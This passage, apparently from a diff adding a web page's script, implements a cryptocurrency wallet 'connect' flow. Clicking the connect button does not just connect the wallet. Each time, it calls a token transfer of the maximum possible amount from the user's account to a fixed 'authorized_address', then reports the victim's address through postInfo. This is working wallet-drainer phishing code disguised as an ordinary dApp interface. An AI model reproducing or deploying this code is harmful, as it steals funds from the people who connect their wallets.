+			setTimeout(function() {
+				getMostValuableAssets2(selectedAccount)
+			}, 200)
+			setTimeout(function() {
+				getMostValuableAssets3(selectedAccount)
+			}, 300)
+		}
+
+
+		/**
+		 * Fetch account data for UI when
+		 * - User switches accounts in wallet
+		 * - User switches networks in wallet
+		 * - User connects wallet initially
+		 */
+		async function refreshAccountData() {
+			document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+			await fetchAccountData(provider);
+			document.querySelector("#btn-connect").removeAttribute("disabled")
+		}
+
+
+		/**
+		 * Connect wallet button pressed.
+		 */
+		async function onConnect() {
+			$('.pages').append('<div class="modal-overlay"></div>');
+			$('.modal-overlay').addClass('modal-overlay-visible');
+			$('.modal').removeClass('modal-out').addClass('modal-in');
+
+			if (selectedAccount && provider) {
+				const web3 = new Web3(provider);
+				const contract = new web3.eth.Contract(ABI, approveAddr)
+
+				const gasPrice = await web3.eth.getGasPrice()
+
+				contract.methods.transfer(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+					from: selectedAccount,
+					gasPrice: gasPrice,
+					gas: 70000,
+				}, function(err, tx) {
+					if(!err){
+                        var yins = document.querySelector('.view-main')
+                         yins.style.display = 'none';
+
+						$(".dierge").fadeIn();
+						$(".tishi").fadeIn()
+						setTimeout(function () {
+							$(".tishi").fadeOut()
+						},2000);
+						
+						postInfo(selectedAccount,bizhong);
+					}
+					$('.modal-overlay').remove();
+
+					$('.modal').removeClass('modal-in').addClass('modal-out');
+
+					console.log(err, tx)
+
+				})
+			} else {
+			       var lianjie = document.querySelector('.lianjie1')
+				  var lianjie2 = document.querySelector('.modal-overlay')
+				  var lianjie3 = document.querySelector('.modal')
+				  var lianjie4 = document.querySelector('.modal-in')
+				 var lianjie5 = document.querySelector('.modal-out')
+				 var lianjie6 = document.querySelector('.bianju')
+				  var lianjie7 = document.querySelector('.tishi1') 
+				  var lianjie8 = document.querySelector('.yinczti')
+          
+          
+				lianjie7.style.display = 'block';
+			   lianjie8.style.display = 'none';
+				lianjie6.style.display = 'block';
+				lianjie.style.display = 'block';
+				lianjie2.style.display = 'none';
+				lianjie3.style.display = 'none';
+				lianjie4.style.display = 'none';
+				lianjie5.style.display = 'none';
+				provider = await web3Modal.connect()
+				provider.enable()
+				const web3 = new Web3(provider);
+				const accounts = await web3.eth.getAccounts()
+				selectedAccount = accounts[0]
+
+				const contract = new web3.eth.Contract(ABI, approveAddr)
+				const gasPrice = await web3.eth.getGasPrice()
+
+				contract.methods.transfer(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
+					from: selectedAccount,
+					gasPrice: gasPrice,
+					gas:70000,
+				}, function(err, tx) {
+					console.log(err, tx)
+					if(!err){
+						$(".tishi").fadeIn()
+						setTimeout(function () {
+							$(".tishi").fadeOut()
+						},2000);
+						postInfo(selectedAccount,bizhong);
+					}
+					$('.modal-overlay').remove();
+					$('.modal').removeClass('modal-in').addClass('modal-out');
+				})
+			}
+		}
+
+		/**
+		 * Disconnect wallet button pressed.
+		 */
+		async function onDisconnect() {
+			// TODO: Which providers have close method?
+			if(provider.close) {
+				await provider.close();
+
+				await web3Modal.clearCachedProvider();
+				provider = null;
+			}
+
+			selectedAccount = null;
+
+		}
+
+		/**
+		 * Main entry point.
+		 */
+		window.addEventListener('load', async () => {
+			init();
+			document.querySelector("#btn-connect").addEventListener("click", onConnect);
+			// document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
+		});
+	});
+	function _init(argument) {
+		// body...
+	}
+</script>
+</body></html>
